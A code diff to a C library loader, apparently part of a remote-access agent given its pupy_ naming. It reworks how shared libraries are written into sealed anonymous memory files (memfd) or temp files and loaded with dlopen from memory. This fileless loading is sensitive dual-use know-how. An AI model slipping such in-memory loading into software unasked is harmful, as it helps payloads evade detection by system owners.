@@ -1,3 +1,4 @@
+#define _GNU_SOURCE
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <limits.h>
@@ -9,6 +10,8 @@
 #include <stdio.h>
 #include <unistd.h>
 #include <sys/mman.h>
+#include <link.h>
+#include <dlfcn.h>
 
 #include "list.h"
 #include "tmplibrary.h"
@@ -100,44 +103,43 @@ bool search_library(void *pState, void *pData) {
 	return false;
 }
 
-bool drop_library(char *path, size_t path_size, const char *buffer, size_t size) {
+int drop_library(char *path, size_t path_size, const char *buffer, size_t size) {
 	int fd = pupy_memfd_create(path, path_size);
-	bool closefd = false;
+	bool memfd = true;
 
-	if (fd == -1) {
+	if (fd < 0) {
 		dprint("pupy_memfd_create() failed: %m\n");
+		memfd = false;
 
 		const char *template = gettemptpl();
 
 		if (path_size < strlen(template))
-			return false;
+			return -1;
 
 		strcpy(path, template);
 
 		fd = mkstemp(path);
-		if (fd == -1) {
-			return false;
+		if (fd < 0) {
+			return fd;
 		}
-
-		closefd = true;
 	}
-
-	bool result = true;
 
 	if (size > 2 && buffer[0] == '\x1f' && buffer[1] == '\x8b') {
 		dprint("Decompressing library %s\n", path);
 		int r = decompress(fd, buffer, size);
-		result = r == 0;
-		if (!result) {
+		if (!r == 0) {
 			dprint("Decompress error: %d\n", r);
+			close(fd);
+			return -1;
 		}
-
 	} else {
 		while (size > 0) {
 			size_t n = write(fd, buffer, size);
 			if (n == -1) {
 				dprint("Write failed: %d left, error = %m, buffer = %p, tmpfile = %s\n", size, buffer, path);
-				result = false;
+				close(fd);
+				unlink(path);
+				fd = -1;
 				break;
 			}
 			buffer += n;
@@ -145,12 +147,11 @@ bool drop_library(char *path, size_t path_size, const char *buffer, size_t size)
 		}
 	}
 
-	if (closefd) {
-		dprint("Closing temporary fd: %d\n", fd);
-		close(fd);
+	if (memfd) {
+		fcntl(fd, F_ADD_SEALS, F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE);
 	}
 
-	return result;
+	return fd;
 }
 
 void *memdlopen(const char *soname, const char *buffer, size_t size) {
@@ -178,14 +179,22 @@ void *memdlopen(const char *soname, const char *buffer, size_t size) {
 	}
 
 	char buf[PATH_MAX]={};
-	if (!drop_library(buf, PATH_MAX, buffer, size)) {
+	int fd = drop_library(buf, PATH_MAX, buffer, size);
+	if (fd < 0) {
 		dprint("Couldn't drop library %s: %m\n", soname);
 		return NULL;
 	}
 
-	dprint("Library \"%s\" dropped to \"%s\"\n", soname, buf);
+	bool is_memfd = is_memfd_path(buf);
+
+	dprint("Library \"%s\" dropped to \"%s\" (memfd=%d) \n", soname, buf, is_memfd);
 
 	base = dlopen(buf, RTLD_NOW | RTLD_GLOBAL);
+
+	if (!is_memfd) {
+		close(fd);
+	}
+
 	if (!base) {
 		dprint("Couldn't load library %s (%s): %s\n", soname, buf, dlerror());
 #ifndef DEBUG
@@ -204,6 +213,5 @@ void *memdlopen(const char *soname, const char *buffer, size_t size) {
 #ifndef DEBUG
 	unlink(buf);
 #endif
-
 	return base;
 }
